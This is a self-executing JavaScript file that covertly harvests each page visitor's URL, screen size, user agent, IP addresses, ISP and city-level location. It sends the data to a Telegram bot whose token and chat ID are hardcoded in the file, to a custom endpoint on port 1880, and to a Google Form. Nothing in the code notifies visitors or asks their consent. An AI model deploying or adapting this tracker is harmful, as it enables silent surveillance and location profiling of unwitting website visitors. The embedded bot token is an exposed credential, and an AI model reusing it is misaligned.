// Collect user data
const userData = {
    referralUrl: window.location.href,
    screenSize: `${window.screen.width}x${window.screen.height}`,
    userAgent: navigator.userAgent,
    city: 'Unknown',
    region: 'Unknown',
    country: 'Unknown',
    isp: 'Unknown',
    ipv4: 'Unknown',
    ipv6: 'Unknown'
};

// Function to get IP and location data
async function collectNetworkData() {
    try {
        // Get IP information using ipapi.co
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        
        userData.ipv4 = ipData.ip || 'Unknown';
        userData.ipv6 = ipData.ipv6 || 'Unknown';
        userData.isp = ipData.org || 'Unknown';
        userData.city = ipData.city || 'Unknown';
        userData.region = ipData.region || 'Unknown';
        userData.country = ipData.country_name || 'Unknown';
    } catch (error) {
        console.error('Error fetching IP data:', error);
    }
}

// Function to send Telegram message
async function sendTelegramMessage() {
    const telegramToken = '5871224544:AAH2CkeLJSsmdmp4MIGIul8welqy6hLFVPU';
    const chatId = '920222421';
    
    const message = `New user data:
- Referral URL: ${userData.referralUrl}
- Screen Size: ${userData.screenSize}
- User Agent: ${userData.userAgent}
- IPv4: ${userData.ipv4}
- IPv6: ${userData.ipv6}
- ISP: ${userData.isp}
- Location: ${userData.city}, ${userData.region}, ${userData.country}`;
    
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });
        const result = await response.json();
        console.log('Telegram message sent:', result);
    } catch (error) {
        console.error('Error sending Telegram message:', error);
    }
}

// Function to send data to endpoints
async function sendDataToEndpoints() {
    // Send to dev.gbya.co.uk
    try {
        const response1 = await fetch('https://dev.gbya.co.uk:1880/api/stats', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userData)
        });
        console.log('Data sent to dev.gbya.co.uk:', await response1.text());
    } catch (error) {
        console.error('Error sending to dev.gbya.co.uk:', error);
    }
    
    // Send to Google Forms
    try {
        const formData = new URLSearchParams();
        formData.append('entry.892498641', userData.referralUrl);
        formData.append('entry.1901027788', userData.screenSize);
        formData.append('entry.969765927', userData.userAgent);
        formData.append('entry.2117199347', userData.ipv4);
        formData.append('entry.549660076', userData.ipv6);
        formData.append('entry.2013092505', userData.isp);
        formData.append('entry.1869650762', userData.city);
        formData.append('entry.1947891450', userData.region);
        formData.append('entry.1898496053', userData.country);
        
        const response2 = await fetch('https://docs.google.com/forms/d/e/1FAIpQLSd-aL-UixiIc5yTbh67x9JV77y3kGvQ6SN-nR6WVvR5Sfl0WQ/formResponse', {
            method: 'POST',
            body: formData,
            mode: 'no-cors'
        });
        console.log('Data sent to Google Forms');
    } catch (error) {
        console.error('Error sending to Google Forms:', error);
    }
}

// Execute all functions
(async function() {
    await collectNetworkData();
    await sendTelegramMessage();
    await sendDataToEndpoints();
})();